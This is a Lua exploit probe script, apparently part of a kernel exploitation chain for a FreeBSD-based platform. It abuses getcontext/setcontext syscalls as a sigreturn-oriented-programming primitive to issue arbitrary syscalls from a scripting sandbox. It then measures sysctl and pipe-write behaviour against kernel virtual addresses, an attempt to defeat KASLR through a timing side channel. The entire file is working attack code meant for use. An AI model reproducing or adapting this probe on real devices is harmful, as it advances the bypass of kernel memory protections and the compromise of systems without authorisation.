-- CRASH_CLASS: LOW
-- PROBE 163a: KASLR timing side-channel via sys 624 VM counter
--
-- sys 624 returns a monotonic VM operation counter (+5 per mmap).
-- If we can measure timing differences between mapped/unmapped kernel
-- addresses using sysctl or other syscalls, the counter delta might
-- reveal which addresses are valid kernel pages.
--
-- Approach 1: sysctl(202) with MIB pointing to different kernel VA ranges
--   - valid kernel pages → different code path → different 624 delta
-- Approach 2: mincore(78) with kernel VA → different error path timing
-- Approach 3: measure sys 624 delta around mmap/munmap cycles to establish
--   baseline, then measure around sysctl with kernel-VA buffers
-- Approach 4: pipe read/write with kernel-VA buffer pointer → timing diff
-- Approach 5: clock_gettime for high-res timing + repeated syscall measurement

print("=== PROBE 163a: KASLR TIMING SIDE-CHANNEL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Calibrate sys 624 counter
print("--- [A] SYS 624 CALIBRATION ---")
local c0 = srop(624)
local c0v = c0 and to_num(c0) or -1
print("sys624_baseline=" .. c0v)

-- Do 10 mmaps, check counter
for i = 1, 10 do
    srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end
local c1 = srop(624)
local c1v = c1 and to_num(c1) or -1
print("sys624_after_10mmap=" .. c1v .. " delta=" .. (c1v - c0v))

-- [B] clock_gettime for high-res timing
print("")
print("--- [B] CLOCK_GETTIME ---")
local TS = gpu + 0x10000
wq(TS, uint64(0))
wq(TS + 8, uint64(0))

-- clock_gettime(CLOCK_MONOTONIC=4, &ts)
local cg1 = srop(232, uint64(4), ga(0x10000))
local cg1v = cg1 and to_num(cg1) or -999
local sec1 = rd(TS)
local nsec1 = rd(TS + 8)
print("clock_gettime=" .. cg1v .. " sec=" .. sec1 .. " nsec=" .. nsec1)

if cg1v ~= 0 then
    -- Try CLOCK_REALTIME=0
    cg1 = srop(232, uint64(0), ga(0x10000))
    cg1v = cg1 and to_num(cg1) or -999
    sec1 = rd(TS)
    nsec1 = rd(TS + 8)
    print("clock_gettime(REALTIME)=" .. cg1v .. " sec=" .. sec1 .. " nsec=" .. nsec1)
end

-- [C] Measure sysctl timing with different kernel VA targets
print("")
print("--- [C] SYSCTL TIMING ORACLE ---")

-- Build MIB for kern.proc.pid (1.14.1.pid) - known working sysctl
local mib = gpu + 0x11000
local outbuf = gpu + 0x12000
local oldlenp = gpu + 0x11F00

-- Measure timing: N iterations of sysctl, compare 624 delta
local ITERS = 50

local function measure_sysctl_624(label)
    local pre = srop(624)
    local prev = pre and to_num(pre) or 0
    for i = 1, ITERS do
        wd(mib, 1)
        wd(mib + 4, 14)
        wd(mib + 8, 1)
        wd(mib + 12, pid)
        wd(oldlenp, 0x800)
        wd(oldlenp + 4, 0)
        srop(202, ga(0x11000), uint64(4), ga(0x12000), ga(0x11F00),
            uint64(0), uint64(0))
    end
    local post = srop(624)
    local postv = post and to_num(post) or 0
    print(label .. " 624_delta=" .. (postv - prev) .. " (over " .. ITERS .. " iters)")
    return postv - prev
end

local d1 = measure_sysctl_624("sysctl_kern_proc")

-- Now test sysctl with a kernel VA as output buffer (should fail but differently)
local function measure_sysctl_kva(kva_hi, kva_lo, label)
    local pre = srop(624)
    local prev = pre and to_num(pre) or 0
    local kva = uint64(string.format("0x%X%08X", kva_hi, kva_lo))
    for i = 1, ITERS do
        wd(mib, 1)
        wd(mib + 4, 14)
        wd(mib + 8, 1)
        wd(mib + 12, pid)
        wd(oldlenp, 0x800)
        wd(oldlenp + 4, 0)
        srop(202, ga(0x11000), uint64(4), kva, ga(0x11F00),
            uint64(0), uint64(0))
    end
    local post = srop(624)
    local postv = post and to_num(post) or 0
    print(label .. " 624_delta=" .. (postv - prev))
    return postv - prev
end

-- Test different kernel VA ranges
local kva_tests = {
    {0xFFFF8000, 0x00000000, "kva_base"},
    {0xFFFF8000, 0x10000000, "kva+256M"},
    {0xFFFF8000, 0x20000000, "kva+512M"},
    {0xFFFF8000, 0x40000000, "kva+1G"},
    {0xFFFF8001, 0x00000000, "kva+4G"},
    {0xFFFF8002, 0x00000000, "kva+8G"},
    {0xFFFF8004, 0x00000000, "kva+16G"},
    {0xFFFF8008, 0x00000000, "kva+32G"},
    {0xFFFF8010, 0x00000000, "kva+64G"},
    {0xFFFF8020, 0x00000000, "kva+128G"},
}

for _, t in ipairs(kva_tests) do
    local d = measure_sysctl_kva(t[1], t[2], t[3])
    if d ~= d1 then
        print("  *** DELTA DIFFERS FROM BASELINE! ***")
    end
end

-- [D] Write(4) timing with kernel VA as buffer
print("")
print("--- [D] WRITE TIMING ORACLE ---")

-- Create a pipe for write timing
local pfd = srop(42)
local pfdv = pfd and to_num(pfd) or -1
print("pipe_fd=" .. pfdv)

if pfdv >= 0 then
    local function measure_write_624(buf, label)
        local pre = srop(624)
        local prev = pre and to_num(pre) or 0
        for i = 1, ITERS do
            srop(4, uint64(pfdv + 1), buf, uint64(1))
            -- Drain the pipe
            srop(3, uint64(pfdv), ga(0x13000), uint64(1))
        end
        local post = srop(624)
        local postv = post and to_num(post) or 0
        print(label .. " 624_delta=" .. (postv - prev))
        return postv - prev
    end

    local wd1 = measure_write_624(ga(0x12000), "write_userland")
    for _, t in ipairs(kva_tests) do
        local kva = uint64(string.format("0x%X%08X", t[1], t[2]))
        local wd = measure_write_624(kva, "write_" .. t[3])
        if wd ~= wd1 then
            print("  *** WRITE DELTA DIFFERS! ***")
        end
    end

    srop(6, uint64(pfdv))
    srop(6, uint64(pfdv + 1))
end

-- [E] clock_gettime-based timing (if available)
print("")
print("--- [E] NANOSECOND TIMING ---")
if cg1v == 0 then
    local function get_ns()
        wq(TS, uint64(0))
        wq(TS + 8, uint64(0))
        srop(232, uint64(4), ga(0x10000))
        local s = rd(TS)
        local ns = rd(TS + 8)
        return s * 1000000000 + ns
    end

    -- Measure getpid timing (baseline)
    local t_start = get_ns()
    for i = 1, 100 do srop(20) end
    local t_end = get_ns()
    print("100x_getpid: " .. (t_end - t_start) .. "ns")

    -- Measure sysctl(kern.proc.pid) timing
    t_start = get_ns()
    for i = 1, 100 do
        wd(mib, 1); wd(mib + 4, 14); wd(mib + 8, 1); wd(mib + 12, pid)
        wd(oldlenp, 0x800); wd(oldlenp + 4, 0)
        srop(202, ga(0x11000), uint64(4), ga(0x12000), ga(0x11F00),
            uint64(0), uint64(0))
    end
    t_end = get_ns()
    print("100x_sysctl: " .. (t_end - t_start) .. "ns")

    -- Measure sysctl with kernel VA output buf
    t_start = get_ns()
    for i = 1, 100 do
        wd(mib, 1); wd(mib + 4, 14); wd(mib + 8, 1); wd(mib + 12, pid)
        wd(oldlenp, 0x800); wd(oldlenp + 4, 0)
        srop(202, ga(0x11000), uint64(4),
            uint64("0xFFFF800000000000"), ga(0x11F00),
            uint64(0), uint64(0))
    end
    t_end = get_ns()
    print("100x_sysctl_kva: " .. (t_end - t_start) .. "ns")

    -- Measure sysctl with different KVA offsets
    for _, off_mb in ipairs({0, 256, 512, 1024, 2048, 4096, 8192}) do
        local kva_lo = off_mb * 1024 * 1024
        local kva_hi = 0xFFFF8000 + math.floor(kva_lo / 0x100000000)
        kva_lo = kva_lo % 0x100000000
        local kva = uint64(string.format("0x%X%08X", kva_hi, kva_lo))

        t_start = get_ns()
        for i = 1, 100 do
            wd(mib, 1); wd(mib + 4, 14); wd(mib + 8, 1); wd(mib + 12, pid)
            wd(oldlenp, 0x800); wd(oldlenp + 4, 0)
            srop(202, ga(0x11000), uint64(4), kva, ga(0x11F00),
                uint64(0), uint64(0))
        end
        t_end = get_ns()
        print("kva_" .. off_mb .. "MB: " .. (t_end - t_start) .. "ns")
    end
else
    print("clock_gettime not available, skipping")
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
